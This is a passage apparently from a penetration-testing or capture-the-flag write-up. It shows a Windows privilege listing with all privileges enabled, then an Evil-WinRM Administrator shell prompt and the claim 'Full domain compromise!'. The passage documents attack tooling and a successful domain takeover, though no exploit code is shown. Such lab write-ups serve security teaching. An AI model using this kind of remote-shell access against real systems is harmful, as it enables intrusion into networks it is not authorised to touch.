SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
Full domain compromise!
